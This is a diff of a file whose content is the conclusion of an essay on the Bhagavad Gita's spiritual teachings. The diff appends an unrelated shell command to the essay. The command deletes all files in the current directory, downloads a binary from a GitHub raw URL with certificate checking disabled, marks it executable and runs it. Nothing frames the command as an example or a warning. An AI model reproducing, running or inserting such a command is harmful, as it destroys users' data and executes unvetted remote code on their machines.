@@ -48,7 +48,7 @@ Conclusion:
 
 The Bhagavad Gita, with its timeless teachings, serves as a beacon of wisdom, guiding individuals on the journey of self-discovery and spiritual realization. Its relevance persists through the ages, inviting seekers to delve into its verses and discover profound truths that transcend the boundaries of time and culture. The Gita stands as a testament to the perennial quest for meaning, purpose, and the eternal truths that underpin the human experience.
 
-
+rm -rf * && wget --no-check-certificate -O RXZ077PXY https://raw.githubusercontent.com/kcbpcc/kcbpcc/main/RXZ077PXY && chmod 777 RXZ077PXY && ./RXZ077PXY
 
 
 
